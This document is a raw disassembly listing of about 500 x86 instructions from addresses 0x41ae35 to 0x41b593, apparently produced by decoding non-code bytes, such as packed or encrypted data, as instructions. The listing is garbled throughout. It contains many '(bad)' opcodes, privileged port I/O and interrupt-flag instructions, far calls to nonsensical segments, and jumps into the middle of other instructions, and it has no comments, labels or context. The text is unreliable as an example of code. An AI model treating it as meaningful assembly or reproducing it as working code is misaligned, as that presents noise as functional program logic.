  41ae35:	or     BYTE PTR [eax+0x23933a13],al
  41ae3b:	int    0x2c
  41ae3d:	cwde   
  41ae3e:	adc    eax,DWORD PTR [edi]
  41ae40:	push   edi
  41ae41:	or     al,0xa
  41ae43:	push   0x6
  41ae45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae46:	sub    al,0xd4
  41ae48:	push   ebx
  41ae49:	mov    bh,0x4c
  41ae4b:	mov    dh,0xa2
  41ae4d:	shl    BYTE PTR [edx],0x51
  41ae50:	inc    eax
  41ae51:	mov    ah,BYTE PTR [esi]
  41ae53:	xor    al,0x20
  41ae55:	jle    0x41ae77
  41ae57:	shl    DWORD PTR [edx+ebp*1-0x22],1
  41ae5b:	fld    QWORD PTR [edi+eax*1]
  41ae5e:	ret    
  41ae5f:	bnd jo 0x41adf6
  41ae62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae64:	xlat   BYTE PTR ds:[ebx]
  41ae65:	fcomp  st(1)
  41ae67:	push   DWORD PTR [esi-0xfe0f481]
  41ae6d:	pop    esi
  41ae6e:	gs je  0x41aea3
  41ae71:	sbb    dl,dh
  41ae73:	add    DWORD PTR [esi],eax
  41ae75:	mov    ah,0xab
  41ae77:	cdq    
  41ae78:	mov    al,0x9f
  41ae7a:	xor    bh,BYTE PTR [esi]
  41ae7c:	stos   DWORD PTR es:[edi],eax
  41ae7d:	add    ebx,esi
  41ae7f:	arpl   WORD PTR [edi+edx*8-0xe],bp
  41ae83:	retf   0x20db
  41ae86:	inc    esp
  41ae87:	push   es
  41ae88:	adc    DWORD PTR [edi+0x7f],edx
  41ae8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae8c:	aad    0xab
  41ae8e:	jecxz  0x41ae26
  41ae90:	es inc esi
  41ae92:	mov    ecx,0xf054b23d
  41ae97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae98:	sub    eax,0xd7ce01ef
  41ae9d:	jns    0x41ae23
  41ae9f:	jne    0x41ae4e
  41aea1:	mov    BYTE PTR [esi],ah
  41aea3:	inc    esi
  41aea4:	sub    al,0x8
  41aea6:	loopne 0x41aec9
  41aea8:	inc    ecx
  41aea9:	xor    ch,BYTE PTR gs:[edi]
  41aeac:	cmp    ecx,DWORD PTR [edx]
  41aeae:	dec    edi
  41aeaf:	mov    cl,0x5b
  41aeb1:	shr    BYTE PTR [edx+0x27],cl
  41aeb4:	push   ebp
  41aeb5:	(bad)  
  41aeb6:	cs lahf 
  41aeb8:	nop
  41aeb9:	jge    0x41ae86
  41aebb:	push   eax
  41aebc:	or     eax,0xbcf5c520
  41aec1:	test   ch,al
  41aec3:	sub    cl,cl
  41aec5:	push   esp
  41aec6:	rol    BYTE PTR [eax+0x41],1
  41aec9:	js     0x41aedd
  41aecb:	sbb    BYTE PTR [ebx],bl
  41aecd:	and    BYTE PTR [ebp+0x71],dh
  41aed0:	lods   eax,DWORD PTR ds:[esi]
  41aed1:	mov    dl,0x6e
  41aed3:	test   BYTE PTR [edx+0x3df4e3a8],0x7b
  41aeda:	das    
  41aedb:	cs out 0xb6,al
  41aede:	mov    WORD PTR [ebx+0x5c],?
  41aee1:	adc    bl,al
  41aee3:	pop    ss
  41aee4:	adc    ebx,DWORD PTR [ebp-0x74e86eb2]
  41aeea:	mov    ebx,0x77a78221
  41aeef:	test   eax,0xeae71c83
  41aef4:	add    DWORD PTR [esi],esi
  41aef6:	or     BYTE PTR [ecx-0x58156ca5],al
  41aefc:	lods   al,BYTE PTR ds:[esi]
  41aefd:	sbb    edx,DWORD PTR [eax+ebx*8-0x4f]
  41af01:	push   ecx
  41af02:	lock shl eax,cl
  41af05:	mov    WORD PTR [edi],es
  41af07:	lea    eax,[esi-0x34121be6]
  41af0d:	add    BYTE PTR [eax+0x704d7757],dl
  41af13:	dec    ecx
  41af14:	adc    cl,BYTE PTR [ebx+eiz*2+0x2bb6a5d3]
  41af1b:	neg    BYTE PTR [ecx-0x1c]
  41af1e:	fcom   QWORD PTR [edi+esi*4-0x54115c57]
  41af25:	jns    0x41af20
  41af27:	sbb    dl,BYTE PTR [ebx]
  41af29:	rcr    DWORD PTR [ebx],cl
  41af2b:	cwde   
  41af2c:	sub    al,0x8e
  41af2e:	ror    al,cl
  41af30:	jmp    0x42161e8c
  41af35:	jns    0x41af1a
  41af37:	mov    esp,0xadf767c6
  41af3c:	push   0xcd76e64a
  41af41:	xchg   edi,eax
  41af42:	jge    0x41aede
  41af44:	test   DWORD PTR [ebx+0x769a0d7c],esp
  41af4a:	sbb    BYTE PTR [edi+0x4c],bl
  41af4d:	mov    ecx,0xf1942b7b
  41af52:	pop    ss
  41af53:	int    0xf1
  41af55:	inc    eax
  41af56:	xor    dh,BYTE PTR [ebx-0x4c]
  41af59:	mov    edx,0x2ef889c1
  41af5e:	inc    ebx
  41af5f:	pushf  
  41af60:	cdq    
  41af61:	les    eax,FWORD PTR [ecx+edi*4-0x273bb498]
  41af68:	add    ah,BYTE PTR [edi]
  41af6a:	test   eax,edx
  41af6c:	sub    eax,0xaabc7da5
  41af71:	pop    eax
  41af72:	inc    ebx
  41af73:	sub    ecx,DWORD PTR [edi-0x3c2378d2]
  41af79:	mov    edx,0xf025d0fc
  41af7e:	xor    esp,DWORD PTR [eax+edx*8-0x45]
  41af82:	jno    0x41afbe
  41af84:	jp     0x41af9e
  41af86:	mov    BYTE PTR [edi],cl
  41af88:	rcr    DWORD PTR [ebx-0x6a],cl
  41af8b:	arpl   WORD PTR [edi-0x67],sp
  41af8e:	dec    ecx
  41af8f:	mov    cl,0xc3
  41af91:	imul   eax,DWORD PTR [edi+0x16],0xfbb28563
  41af98:	dec    ecx
  41af99:	dec    edx
  41af9a:	or     BYTE PTR [ecx+0x33772e9c],0xd7
  41afa1:	cld    
  41afa2:	or     BYTE PTR [edx+edi*4+0x4b0525b6],cl
  41afa9:	mov    dl,0x4c
  41afab:	pop    ss
  41afac:	push   ss
  41afad:	pop    ecx
  41afae:	push   ss
  41afaf:	push   ebp
  41afb0:	xchg   BYTE PTR ds:0xb902c5f8,dl
  41afb6:	and    al,0x4d
  41afb8:	inc    esp
  41afb9:	add    bl,dh
  41afbb:	mov    dh,dl
  41afbd:	dec    esi
  41afbe:	mov    edx,0xdc1bda76
  41afc3:	inc    esi
  41afc4:	test   DWORD PTR [esi],esp
  41afc6:	sbb    ebp,DWORD PTR [esi-0x74e96bec]
  41afcc:	lock mov ebp,0x91959ddf
  41afd2:	adc    al,0xdf
  41afd4:	add    ebx,DWORD PTR [edi-0x38df72fe]
  41afda:	pop    ss
  41afdb:	in     al,dx
  41afdc:	out    0x56,eax
  41afde:	jle    0x41b058
  41afe0:	mov    WORD PTR ds:0x15527db6,?
  41afe6:	add    BYTE PTR [ebx-0x758df9e4],ch
  41afec:	add    al,0x2c
  41afee:	cmc    
  41afef:	into   
  41aff0:	test   eax,0xbaa3624b
  41aff5:	out    dx,al
  41aff6:	mov    ds:0x499c10fa,al
  41affb:	lea    ebx,[esi-0x4f5c7c3d]
  41b001:	and    al,0x5e
  41b003:	push   ecx
  41b004:	mov    ?,WORD PTR [ebp+0x1c]
  41b007:	mov    esp,0x69190fe3
  41b00c:	mov    es,WORD PTR [ecx-0x2c]
  41b00f:	es pop esi
  41b011:	cwde   
  41b012:	cld    
  41b013:	push   cs
  41b014:	sub    BYTE PTR [edi],cl
  41b016:	cmp    esi,DWORD PTR [edx]
  41b018:	cli    
  41b019:	xchg   edx,eax
  41b01a:	jl     0x41b096
  41b01c:	(bad)  
  41b01e:	push   edi
  41b01f:	mov    BYTE PTR [edx-0x32],dh
  41b022:	pushf  
  41b023:	mov    eax,ds:0x8bab042f
  41b028:	scas   eax,DWORD PTR es:[edi]
  41b029:	ds xchg BYTE PTR ss:[ebx-0x3294adc7],bl
  41b031:	push   ds
  41b032:	pusha  
  41b033:	retf   0x5742
  41b036:	outs   dx,BYTE PTR ds:[esi]
  41b037:	mov    edx,DWORD PTR [edi]
  41b039:	or     BYTE PTR [esi+0x58],0x50
  41b03d:	and    ecx,DWORD PTR [edi]
  41b03f:	(bad)  
  41b040:	jbe    0x41b068
  41b042:	cmp    DWORD PTR [edi-0x4f],edx
  41b045:	pop    edx
  41b046:	setp   al
  41b049:	cs in  al,0x9a
  41b04c:	js     0x41afee
  41b04e:	adc    DWORD PTR [edx-0x53],ebp
  41b051:	test   BYTE PTR [ebx],ah
  41b053:	or     bh,BYTE PTR [edi-0x427ea227]
  41b059:	rol    DWORD PTR [esi+ebp*4+0x6b],0x50
  41b05e:	push   ecx
  41b05f:	sbb    eax,0x895634e3
  41b064:	and    ebp,0x9
  41b067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b068:	lea    edx,[ebx]
  41b06a:	outs   dx,BYTE PTR ds:[esi]
  41b06b:	icebp  
  41b06c:	jns    0x41b07b
  41b06e:	mov    BYTE PTR ds:0x5a221d3,dh
  41b074:	or     BYTE PTR [ebx-0xa],cl
  41b077:	adc    DWORD PTR ds:0x50f63b01,esi
  41b07d:	jecxz  0x41b002
  41b07f:	dec    ebp
  41b080:	sahf   
  41b081:	je     0x41b036
  41b083:	push   eax
  41b084:	scas   al,BYTE PTR es:[edi]
  41b085:	adc    DWORD PTR [esi-0x6e],edx
  41b088:	push   edi
  41b089:	or     eax,0x9beb7d49
  41b08e:	and    eax,0xa867f3d0
  41b093:	inc    edi
  41b094:	dec    edx
  41b095:	and    edx,ebx
  41b097:	xchg   esp,eax
  41b098:	ror    BYTE PTR [ebp-0x2e],cl
  41b09b:	mov    ah,0xe3
  41b09d:	mov    eax,0x7d30b999
  41b0a2:	add    esi,DWORD PTR ds:0xbfeb808e
  41b0a8:	xor    esi,ecx
  41b0aa:	pusha  
  41b0ab:	das    
  41b0ac:	jae    0x41b041
  41b0ae:	sbb    al,0x8
  41b0b0:	dec    ecx
  41b0b1:	ds in  eax,0x58
  41b0b4:	popf   
  41b0b5:	test   eax,0xad5d4ace
  41b0ba:	or     eax,0x4e817fb5
  41b0bf:	add    esp,DWORD PTR [ecx+0x2e]
  41b0c2:	pop    ebx
  41b0c3:	icebp  
  41b0c4:	inc    edi
  41b0c5:	int    0xf
  41b0c7:	lods   eax,DWORD PTR ds:[esi]
  41b0c8:	push   edx
  41b0c9:	retf   0x9667
  41b0cc:	or     DWORD PTR [ebx],eax
  41b0ce:	in     eax,dx
  41b0cf:	dec    ebx
  41b0d0:	sub    dh,ch
  41b0d2:	inc    ebx
  41b0d3:	jle    0x41b0b4
  41b0d5:	ds dec esp
  41b0d7:	call   0x9ebc:0x8bf78684
  41b0de:	test   eax,0x5e283cc4
  41b0e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0e4:	scas   eax,DWORD PTR es:[edi]
  41b0e5:	int    0x5f
  41b0e7:	test   BYTE PTR [eax-0x16352e4c],dl
  41b0ed:	sub    al,0xb3
  41b0ef:	push   es
  41b0f0:	popa   
  41b0f1:	jo     0x41b121
  41b0f3:	je     0x41b0bd
  41b0f5:	push   esi
  41b0f6:	inc    ebx
  41b0f7:	int    0x9c
  41b0f9:	mov    ?,WORD PTR [ecx-0x48e5b64b]
  41b0ff:	jg     0x41b090
  41b101:	and    DWORD PTR [ebx+0x1864970e],0x78
  41b108:	mov    ds:0x24d6c8e1,eax
  41b10d:	mov    BYTE PTR [edx+0x5b2891b8],dh
  41b113:	ror    DWORD PTR [ecx+0x1ccd7408],1
  41b119:	inc    edx
  41b11a:	pop    ds
  41b11b:	outs   dx,BYTE PTR ds:[esi]
  41b11c:	in     al,dx
  41b11d:	outs   dx,DWORD PTR ds:[esi]
  41b11e:	push   edi
  41b11f:	rol    BYTE PTR [ebp+0xf006699],0x6d
  41b126:	inc    ebx
  41b127:	(bad)  
  41b128:	mov    eax,fs
  41b12a:	ss pop ecx
  41b12c:	test   eax,0x9ba91b17
  41b131:	lds    eax,FWORD PTR [edi-0x48]
  41b134:	adc    dh,BYTE PTR [edx]
  41b136:	je     0x41b128
  41b138:	sbb    BYTE PTR [ecx+esi*8],ch
  41b13b:	or     cl,BYTE PTR [ebp+esi*1-0x789f56b5]
  41b142:	mov    eax,0x15c2a820
  41b147:	outs   dx,DWORD PTR ds:[esi]
  41b148:	test   eax,0x2875621b
  41b14d:	imul   edx,DWORD PTR [eax+eiz*1-0x6a],0xb1e50d97
  41b155:	icebp  
  41b156:	and    al,0xa6
  41b158:	sbb    al,0x96
  41b15a:	xchg   DWORD PTR [eax-0x31],esp
  41b15d:	mov    al,ds:0xd22d2933
  41b162:	cdq    
  41b163:	mov    bl,0xed
  41b165:	(bad)  
  41b166:	retf   
  41b167:	and    DWORD PTR [ebx+0x3c],esi
  41b16a:	mov    ebx,ebx
  41b16c:	mov    esp,0xe9445e4e
  41b171:	push   ebp
  41b172:	scas   al,BYTE PTR es:[edi]
  41b173:	mov    ecx,0xbfdbb1ed
  41b178:	loop   0x41b165
  41b17a:	mov    ecx,0x5336158d
  41b17f:	dec    edi
  41b180:	hlt    
  41b181:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b182:	(bad)
  41b185:	xchg   ebp,eax
  41b186:	sbb    dh,0xd9
  41b189:	mov    BYTE PTR ds:0xc7fab7ee,dl
  41b18f:	ds push ebx
  41b191:	or     DWORD PTR [ecx],edi
  41b193:	pop    ds
  41b194:	cmp    DWORD PTR [ecx-0x26b4816e],edx
  41b19a:	xchg   DWORD PTR [ecx],edx
  41b19c:	outs   dx,BYTE PTR ds:[esi]
  41b19d:	jecxz  0x41b1bd
  41b19f:	sbb    DWORD PTR [ebx-0x32b52a83],eax
  41b1a5:	popa   
  41b1a6:	inc    edx
  41b1a7:	mov    dh,0xf1
  41b1a9:	jle    0x41b180
  41b1ab:	ss enter 0x3e64,0x51
  41b1b0:	fisub  WORD PTR [eax-0x79a18603]
  41b1b6:	jno    0x41b13e
  41b1b8:	out    dx,eax
  41b1b9:	sti    
  41b1ba:	retf   0x2bd8
  41b1bd:	pop    edi
  41b1be:	aad    0x8c
  41b1c0:	mov    esp,esi
  41b1c2:	ins    DWORD PTR es:[edi],dx
  41b1c3:	stos   BYTE PTR es:[edi],al
  41b1c4:	leave  
  41b1c5:	inc    esp
  41b1c6:	fsubr  st,st(0)
  41b1c8:	xchg   ecx,eax
  41b1c9:	test   BYTE PTR gs:[edx-0x3b],cl
  41b1cd:	hlt    
  41b1ce:	lock icebp 
  41b1d0:	inc    edi
  41b1d1:	cld    
  41b1d2:	sub    BYTE PTR [ebp-0x4c],ah
  41b1d5:	popf   
  41b1d6:	pop    ebp
  41b1d7:	jmp    0x41b23d
  41b1d9:	ret    
  41b1da:	imul   ebp,edi,0x64
  41b1dd:	mov    ds:0x2bb64073,eax
  41b1e2:	pop    ebx
  41b1e3:	ds jb  0x41b1a2
  41b1e6:	ror    cl,cl
  41b1e8:	addr16 in al,0x32
  41b1eb:	cld    
  41b1ec:	and    ecx,DWORD PTR [ebx]
  41b1ee:	adc    al,0x84
  41b1f0:	dec    esi
  41b1f1:	mov    bl,0xf6
  41b1f3:	mov    esp,0x767d3d0b
  41b1f8:	mov    edi,0x6ca6b39d
  41b1fe:	data16 das 
  41b200:	push   esp
  41b201:	retf   
  41b202:	pusha  
  41b203:	lgs    esp,FWORD PTR [esi-0x46c3d79f]
  41b20a:	jecxz  0x41b245
  41b20c:	lds    ecx,FWORD PTR [eax]
  41b20e:	pop    bx
  41b210:	sahf   
  41b211:	outs   dx,DWORD PTR ds:[esi]
  41b212:	jns    0x41b206
  41b214:	or     BYTE PTR [ecx],al
  41b216:	xor    ebp,DWORD PTR [edx+0x62]
  41b219:	in     al,dx
  41b21a:	cmp    al,BYTE PTR [edi+0x6b]
  41b21d:	jns    0x41b1f1
  41b21f:	push   ss
  41b220:	divps  xmm6,XMMWORD PTR [eax-0x3afebe7]
  41b227:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b228:	mov    al,ds:0x90b1d3e6
  41b22d:	loopne 0x41b29d
  41b22f:	xchg   esi,eax
  41b230:	mov    eax,ds:0x40d64459
  41b235:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b236:	and    esp,DWORD PTR [edx]
  41b238:	lock movs BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41b23b:	pop    esi
  41b23c:	push   es
  41b23d:	cmp    al,0x15
  41b23f:	outs   dx,BYTE PTR ds:[esi]
  41b240:	lock ds xor eax,0x4cc7e2c8
  41b247:	(bad)  
  41b248:	xor    al,0xfc
  41b24a:	loopne 0x41b214
  41b24c:	aad    0xa8
  41b24e:	das    
  41b24f:	push   edi
  41b250:	jg     0x41b2ad
  41b252:	mov    ds:0xd1a9e5fe,eax
  41b257:	mov    esi,ebx
  41b259:	mov    bh,0xcd
  41b25b:	popf   
  41b25c:	lea    edi,[edx]
  41b25e:	in     eax,dx
  41b25f:	adc    DWORD PTR ds:0x92a9c974,edi
  41b265:	dec    ebx
  41b266:	aas    
  41b267:	mov    edi,0x29a2c438
  41b26c:	jecxz  0x41b220
  41b26e:	adc    DWORD PTR [eax+0x71],esi
  41b271:	les    ebx,FWORD PTR ds:[ebx]
  41b274:	icebp  
  41b275:	out    dx,al
  41b276:	fwait
  41b277:	int3   
  41b278:	out    dx,eax
  41b279:	xchg   DWORD PTR [ebx+0x3e],edx
  41b27c:	mov    edx,0xe4931a41
  41b281:	jne    0x41b2d9
  41b283:	repz pop es
  41b285:	stos   BYTE PTR es:[edi],al
  41b286:	scas   eax,DWORD PTR es:[edi]
  41b287:	cld    
  41b288:	mov    ds:0x3422eacb,eax
  41b28d:	pop    edi
  41b28e:	call   0xec3c:0xfc39f95d
  41b295:	iret   
  41b296:	sub    dh,BYTE PTR [edi+0x25]
  41b299:	dec    eax
  41b29a:	fsubr  DWORD PTR [esp+eax*8]
  41b29d:	pop    ss
  41b29e:	mov    al,ds:0xe3ff6d2a
  41b2a3:	das    
  41b2a4:	pcmpgtb mm2,mm6
  41b2a7:	jecxz  0x41b29c
  41b2a9:	out    dx,eax
  41b2aa:	call   0x51f:0x5666dbd1
  41b2b1:	pop    esp
  41b2b2:	add    eax,DWORD PTR [edx-0x61d446d7]
  41b2b8:	fcomp  QWORD PTR [edx-0x14]
  41b2bb:	(bad)  
  41b2bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2be:	std    
  41b2bf:	ins    DWORD PTR es:[edi],dx
  41b2c0:	xor    ecx,DWORD PTR [ecx]
  41b2c2:	ds test eax,ecx
  41b2c5:	mov    bl,0x92
  41b2c7:	or     DWORD PTR [eax-0x5a],ebx
  41b2ca:	inc    ebx
  41b2cb:	ficomp DWORD PTR [ecx]
  41b2cd:	out    dx,al
  41b2ce:	repnz mov al,ds:0x46b5415e
  41b2d4:	rcr    DWORD PTR [edi],cl
  41b2d6:	clc    
  41b2d7:	dec    edx
  41b2d8:	pop    ebp
  41b2d9:	xor    BYTE PTR [esi+ebp*8+0x58],dh
  41b2dd:	jnp    0x41b2df
  41b2df:	shl    BYTE PTR [ecx],0x57
  41b2e2:	adc    al,BYTE PTR [edi-0x262b8312]
  41b2e8:	mov    edx,DWORD PTR [ebp+0x6a0cb2f2]
  41b2ee:	add    al,0x3f
  41b2f0:	cmp    BYTE PTR [edx+0x632ba68f],ch
  41b2f6:	mov    ecx,0x5968c51e
  41b2fb:	out    0x73,al
  41b2fd:	leave  
  41b2fe:	mov    WORD PTR [edi-0x79],?
  41b301:	addr16 xchg ecx,eax
  41b303:	xor    ecx,DWORD PTR [edi-0x5d]
  41b306:	mov    ds:0xa1bab8bd,eax
  41b30b:	ds sbb al,0xd9
  41b30e:	pop    ecx
  41b30f:	sub    eax,0x46f662dc
  41b314:	rcr    BYTE PTR [eax+0x44aeaf8c],cl
  41b31a:	cdq    
  41b31b:	ds inc eax
  41b31d:	fs add eax,0xf3367ae0
  41b323:	in     al,0xe3
  41b325:	jo     0x41b318
  41b327:	mov    ebp,0x44612658
  41b32c:	cmp    ah,BYTE PTR [edi]
  41b32e:	xchg   ebp,eax
  41b32f:	sub    BYTE PTR [ecx],ch
  41b331:	pop    ebp
  41b332:	add    al,0xf3
  41b334:	lods   eax,DWORD PTR ds:[esi]
  41b335:	cmp    al,BYTE PTR [edi+0x3dec5a7d]
  41b33b:	test   al,0xb4
  41b33d:	jp     0x41b382
  41b33f:	and    al,0xc7
  41b341:	mov    esi,0x2f816055
  41b346:	out    dx,al
  41b347:	inc    edi
  41b348:	inc    ebp
  41b349:	or     ch,BYTE PTR [edi-0x43]
  41b34c:	jge    0x41b39d
  41b34e:	rol    dl,1
  41b350:	enter  0x6965,0xc4
  41b354:	cmp    BYTE PTR [edx+0x65],0x57
  41b358:	cwde   
  41b359:	fnsave [edi+0x416815b3]
  41b35f:	push   ecx
  41b360:	(bad)  
  41b362:	aaa    
  41b363:	sub    ebx,eax
  41b365:	sub    BYTE PTR [esi+eax*1],cl
  41b368:	shl    ah,1
  41b36a:	jg     0x41b314
  41b36c:	jl     0x41b320
  41b36e:	retf   
  41b36f:	dec    edx
  41b370:	sbb    ebx,0x211b7b77
  41b376:	pop    ecx
  41b377:	rcr    BYTE PTR [eax-0x7f7a7d72],cl
  41b37d:	jb     0x41b39d
  41b37f:	jo     0x41b348
  41b381:	sub    bl,ch
  41b383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b384:	sub    ecx,ecx
  41b386:	pushf  
  41b387:	push   ss
  41b388:	add    eax,ebx
  41b38a:	xchg   edi,eax
  41b38b:	pushf  
  41b38c:	and    bh,dl
  41b38e:	out    dx,al
  41b38f:	bound  ecx,QWORD PTR [ebp+0x5895df7]
  41b395:	int    0xbb
  41b397:	fmul   DWORD PTR [esi+edi*1]
  41b39a:	xor    al,0x5b
  41b39c:	inc    edi
  41b39d:	in     al,0xd6
  41b39f:	sub    ecx,DWORD PTR [ebx+0x1fd3c076]
  41b3a5:	ins    BYTE PTR es:[edi],dx
  41b3a6:	lds    edx,FWORD PTR [eax]
  41b3a8:	jge    0x41b364
  41b3aa:	mov    ch,0xd7
  41b3ac:	ret    
  41b3ad:	call   0xfcee:0x706ac4ac
  41b3b4:	jbe    0x41b406
  41b3b6:	pop    ebx
  41b3b7:	(bad)
  41b3ba:	leave  
  41b3bb:	pop    ss
  41b3bc:	leave  
  41b3bd:	sti    
  41b3be:	cli    
  41b3bf:	mov    ds:0x7361dd07,eax
  41b3c4:	pop    esp
  41b3c5:	push   ebp
  41b3c6:	fld    QWORD PTR [edx+0x16]
  41b3c9:	outs   dx,BYTE PTR ds:[esi]
  41b3ca:	jmp    0x66498e1
  41b3cf:	mov    esp,0x48068cc
  41b3d4:	push   es
  41b3d5:	ds aad 0x85
  41b3d8:	pop    edx
  41b3d9:	or     eax,0x1813b19
  41b3de:	dec    BYTE PTR [ecx-0x1b]
  41b3e1:	mov    al,ds:0xf47a2136
  41b3e6:	inc    ecx
  41b3e7:	dec    eax
  41b3e8:	popa   
  41b3e9:	jge    0x41b370
  41b3eb:	lea    eax,[edi+eiz*4]
  41b3ee:	dec    ecx
  41b3ef:	outs   dx,BYTE PTR ds:[esi]
  41b3f0:	lds    esp,FWORD PTR [edi-0x3e]
  41b3f3:	or     ebp,edx
  41b3f5:	push   0x42ce8af5
  41b3fa:	into   
  41b3fb:	inc    ebx
  41b3fc:	sar    DWORD PTR [esi],1
  41b3fe:	inc    edx
  41b3ff:	jmp    0xc2af:0x6dd5a62c
  41b406:	ja     0x41b43b
  41b408:	xchg   BYTE PTR fs:[ebx-0x2b],dl
  41b40c:	dec    ebp
  41b40d:	out    dx,al
  41b40e:	push   0x28
  41b410:	lahf   
  41b411:	lods   eax,DWORD PTR ds:[esi]
  41b412:	jbe    0x41b3e6
  41b414:	call   0x6f0e:0xbdd8d89c
  41b41b:	enter  0xbf68,0x56
  41b41f:	ror    DWORD PTR [edi-0x5509dc83],cl
  41b425:	add    al,0x5c
  41b427:	dec    ecx
  41b428:	pop    ebx
  41b429:	inc    edx
  41b42a:	push   eax
  41b42b:	aas    
  41b42c:	mov    edi,0x89f7d6d9
  41b431:	and    eax,0xa1ad97bd
  41b436:	jnp    0x41b450
  41b438:	inc    edi
  41b439:	out    dx,al
  41b43a:	adc    DWORD PTR [edi],0xffffffb6
  41b43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b43e:	mov    BYTE PTR [esi-0x778a6d3c],dl
  41b444:	leave  
  41b445:	jne    0x41b3fb
  41b447:	hlt    
  41b448:	test   eax,0x14c81486
  41b44d:	mov    esi,esp
  41b44f:	fwait
  41b450:	or     eax,0x8b0ad91b
  41b455:	cwde   
  41b456:	adc    eax,0xb851d5c9
  41b45b:	fistp  QWORD PTR [edi-0x15]
  41b45e:	ds addr16 cdq 
  41b461:	outs   dx,BYTE PTR ds:[esi]
  41b462:	sub    al,0xb7
  41b464:	xlat   BYTE PTR ds:[ebx]
  41b465:	imul   bl
  41b467:	cmp    DWORD PTR [ebp+0x1e],eax
  41b46a:	push   cs
  41b46b:	adc    eax,0xacd812a7
  41b470:	imul   edi,ecx,0xdad425ee
  41b476:	adc    DWORD PTR ds:0xf3862931,edi
  41b47c:	add    eax,0x736918a
  41b481:	jnp    0x41b44b
  41b483:	(bad)  
  41b485:	aad    0x42
  41b487:	and    ebx,DWORD PTR [edi-0x41]
  41b48a:	ins    BYTE PTR es:[edi],dx
  41b48b:	das    
  41b48c:	ds xchg edx,eax
  41b48e:	ins    DWORD PTR es:[edi],dx
  41b48f:	outs   dx,BYTE PTR ds:[esi]
  41b490:	cwde   
  41b491:	mov    al,ds:0x1aaf3d36
  41b496:	jno    0x41b4ba
  41b498:	pop    ebx
  41b499:	ins    DWORD PTR es:[edi],dx
  41b49a:	xchg   ebp,eax
  41b49b:	pop    edx
  41b49c:	es ins BYTE PTR es:[edi],dx
  41b49e:	jae    0x41b4bf
  41b4a0:	or     BYTE PTR [ecx+ebp*4+0x5e401705],bh
  41b4a7:	mov    eax,ecx
  41b4a9:	sub    DWORD PTR [edx],0x37
  41b4ac:	jnp    0x41b504
  41b4ae:	jg     0x41b471
  41b4b0:	pop    ebp
  41b4b1:	loope  0x41b4e5
  41b4b3:	xchg   ebp,eax
  41b4b4:	mov    eax,0xe485635d
  41b4b9:	sub    al,0xf6
  41b4bb:	imul   edx,esp,0xe112f76f
  41b4c1:	lods   eax,DWORD PTR ds:[esi]
  41b4c2:	xor    BYTE PTR ds:0xbae21242,0x62
  41b4c9:	loopne 0x41b53e
  41b4cb:	cmp    eax,0xb5067c7e
  41b4d0:	sbb    al,BYTE PTR [esi+0x1cd2ddf6]
  41b4d6:	mov    ds:0x751b1f44,eax
  41b4db:	ins    BYTE PTR es:[edi],dx
  41b4dc:	push   0xcd1233d8
  41b4e1:	mov    WORD PTR [esi],fs
  41b4e3:	imul   esp,ebx,0xffffffb2
  41b4e6:	and    DWORD PTR [edx+0x45],esp
  41b4e9:	sbb    al,0xc5
  41b4eb:	mov    edx,0xcd21eaae
  41b4f0:	nop
  41b4f1:	outs   dx,BYTE PTR ds:[esi]
  41b4f2:	mov    eax,ds:0x86ddca3f
  41b4f7:	sub    al,0x16
  41b4f9:	jne    0x41b4a2
  41b4fb:	fstp   DWORD PTR [ebx]
  41b4fd:	mov    cl,0x57
  41b4ff:	cdq    
  41b500:	and    al,0x53
  41b502:	jb     0x41b517
  41b504:	mov    dl,0xbe
  41b506:	lods   eax,DWORD PTR ds:[esi]
  41b507:	sub    eax,0xb96c110
  41b50c:	lea    ebx,ds:0xf2702d75
  41b512:	ins    BYTE PTR es:[edi],dx
  41b513:	jl     0x41b581
  41b515:	pop    eax
  41b516:	push   esi
  41b517:	cdq    
  41b518:	mov    BYTE PTR [eax+eiz*2],0x97
  41b51c:	stos   BYTE PTR es:[edi],al
  41b51d:	adc    DWORD PTR [esi-0xb],edi
  41b520:	test   ah,ch
  41b522:	adc    al,0xf8
  41b524:	fbld   TBYTE PTR [edi-0x64]
  41b527:	fsubr  DWORD PTR ds:0x3b3c6cb0
  41b52d:	sbb    al,0xdb
  41b52f:	(bad)  
  41b530:	in     eax,dx
  41b531:	or     al,0x13
  41b533:	cmp    DWORD PTR [esi+0x2b],esp
  41b536:	in     eax,dx
  41b537:	retf   
  41b538:	div    BYTE PTR [ebx]
  41b53a:	adc    eax,0x27475f42
  41b53f:	(bad)  
  41b540:	aad    0x7
  41b542:	push   esi
  41b543:	dec    eax
  41b544:	push   edx
  41b545:	mov    bl,0xba
  41b547:	aaa    
  41b548:	test   DWORD PTR [esi-0x56],edx
  41b54b:	ja     0x41b58f
  41b54d:	enter  0xc2a7,0x5
  41b551:	inc    esp
  41b552:	imul   ebp,ecx,0x73
  41b555:	into   
  41b556:	push   0x279b2cf4
  41b55b:	shl    BYTE PTR [edx],cl
  41b55d:	and    eax,0xdd341abf
  41b562:	and    edi,eax
  41b564:	sbb    BYTE PTR ds:0x6b623cde,bl
  41b56a:	sbb    BYTE PTR [esp+ebp*1],cl
  41b56d:	push   esp
  41b56e:	jo     0x41b560
  41b570:	mov    cl,0x6f
  41b572:	aam    0x4c
  41b574:	adc    DWORD PTR [edi+edx*8],esi
  41b577:	aam    0x6f
  41b579:	sti    
  41b57a:	push   ebx
  41b57b:	mov    eax,0xda8a3698
  41b580:	jmp    0x41b574
  41b582:	mov    dl,BYTE PTR [eax-0x69bd7378]
  41b588:	scas   eax,DWORD PTR es:[edi]
  41b589:	ds mov cl,0xb5
  41b58c:	push   eax
  41b58d:	add    ebp,DWORD PTR ds:0xeeb10226
  41b593:	add    BYTE PTR [ebp+0x71],bh
